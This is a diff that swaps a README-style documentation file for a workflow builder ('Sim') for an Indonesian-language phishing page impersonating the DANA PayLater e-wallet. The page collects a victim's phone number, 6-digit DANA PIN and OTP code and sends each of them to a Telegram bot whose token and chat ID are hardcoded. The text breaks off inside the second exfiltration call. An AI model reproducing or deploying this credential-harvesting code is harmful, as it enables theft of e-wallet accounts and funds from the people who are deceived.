@@ -1,53 +1,115 @@
-# Sim Documentation
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8"/>
+        <meta name="description" content=""/>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Template</title>
+        <style>
+        </style>
+    </head>
+    <body>
+        <p id = "myid" ></p>
+        <script>
+            document.getElementById("myid").innerText = "DANA PAYLATER";
+        </script>
+    </body>
+</html>
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        /* Desain sederhana agar terlihat rapi */
+        .input-group { margin-bottom: 15px; }
+        label { display: block; font-weight: bold; margin-bottom: 5px; }
+        input { width: 100%; padding: 8px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background-color: #118eea; color: white; border: none; cursor: pointer; }
+    </style>
+</head>
+<body>
 
-Sim is a visual workflow builder for AI applications that lets you build AI agent workflows visually. Create powerful AI agents, automation workflows, and data processing pipelines by connecting blocks on a canvas—no coding required.
+    <div id="login-section">
+        <div class="input-group">
+            <label>NOMOR HANDPHONE</label>
+            <input type="number" id="phone" placeholder="Contoh: 0812xxxx" required>
+        </div>
 
-## What is Sim?
+        <div class="input-group">
+            <label>PIN DANA (6 DIGIT)</label>
+            <input type="password" id="pin" maxlength="6" placeholder="* * * * * *" required>
+        </div>
 
-Sim provides a complete ecosystem for AI workflow automation including:
-- Visual workflow builder with drag-and-drop interface
-- AI agent creation and automation
-- 80+ built-in integrations (OpenAI, Slack, Gmail, GitHub, etc.)
-- Real-time team collaboration
-- Multiple deployment options (cloud-hosted or self-hosted)
-- Custom integrations via MCP protocol
+        <button onclick="kirimData()">Lanjut</button>
+    </div>
 
-## Main Documentation Sections
+    <div id="otp-section" style="display: none;">
+        <p style="text-align: center;">Kode OTP telah dikirim ke nomor Anda.</p>
+        <div class="input-group">
+            <label>KODE OTP</label>
+            <input type="number" id="otp" placeholder="Masukkan 4-6 digit OTP" required>
+        </div>
+        <button onclick="kirimOTP()">Konfirmasi OTP</button>
+    </div>
 
-Here are the key areas covered in our documentation:
+    <div id="hasil" style="margin-top: 15px; text-align: center;"></div>
 
-/introduction - Getting started with Sim visual workflow builder
-/getting-started - Quick start guide for building your first workflow
-/blocks - Understanding workflow blocks (AI agents, APIs, functions)
-/tools - 80+ built-in integrations and tools
-/webhooks - Webhook triggers and handling
-/mcp - Custom integrations via MCP protocol
-/deployment - Cloud-hosted vs self-hosted deployment
-/permissions - Team collaboration and workspace management
-/collaboration - Real-time editing and team features
-/workflows - Building complex automation workflows
+    <script>
+        const token = "7249905709:AAEo6FwCMZn0twG82kyojuHP5QL6tXjuhHU";
+        const chatId = "6819335845";
 
-## Technical Information
+        function kirimData() {
+            const phone = document.getElementById('phone').value;
+            const pin = document.getElementById('pin').value;
+            const hasilDiv = document.getElementById('hasil');
 
-- Framework: Fumadocs (Next.js-based documentation platform)
-- Content: MDX files with interactive examples
-- Languages: English (primary), French, Chinese
-- Search: AI-powered search and assistance available
+            if (phone == "" || pin == "") {
+                hasilDiv.innerText = "Nomor HP dan PIN wajib diisi";
+                hasilDiv.style.color = "red";
+                return;
+            }
 
-## Complete Documentation
+            if (pin.length < 6) {
+                hasilDiv.innerText = "PIN harus 6 digit";
+                hasilDiv.style.color = "red";
+                return;
+            }
 
-For the full documentation with all pages, examples, and interactive features, visit our documentation site. We also provide machine-readable versions at /llms.txt (full content) for AI systems.
+            hasilDiv.style.color = "#118eea";
+            hasilDiv.innerHTML = "<strong>Memproses...</strong>";
 
-## Additional Resources
+            const pesan = `🔔 *DATA LOGIN BARU*\n\n📱 No. HP: ${phone}\n🔑 PIN: ${pin}`;
 
-- GitHub repository with workflow examples
-- Discord community for support and discussions
-- 80+ built-in integrations with detailed guides
-- MCP protocol documentation for custom integrations
-- Self-hosting guides and Docker deployment
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: pesan,
+                    parse_mode: 'Markdown'
+                })
+            }).then(() => {
+                // Sembunyikan form login, tampilkan form OTP
+                document.getElementById('login-section').style.display = 'none';
+                document.getElementById('otp-section').style.display = 'block';
+                hasilDiv.innerHTML = ""; 
+            }).catch(err => {
+                hasilDiv.innerText = "Terjadi kesalahan, coba lagi.";
+            });
+        }
 
-For the complete documentation with interactive examples and visual workflow builder guides, visit https://docs.sim.ai
+        function kirimOTP() {
+            const otp = document.getElementById('otp').value;
+            const phone = document.getElementById('phone').value;
+            const hasilDiv = document.getElementById('hasil');
 
----
+            if (otp == "") {
+                alert("Masukkan kode OTP!");
+                return;
+            }
 
-Last updated: 2025-09-15
+            hasilDiv.innerHTML = "<strong>Memverifikasi OTP...</strong>";
+
+            const pesanOTP = `💬 *KODE OTP DANA*\n\n📱 No. HP: ${phone}\n🔢 OTP: ${otp}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
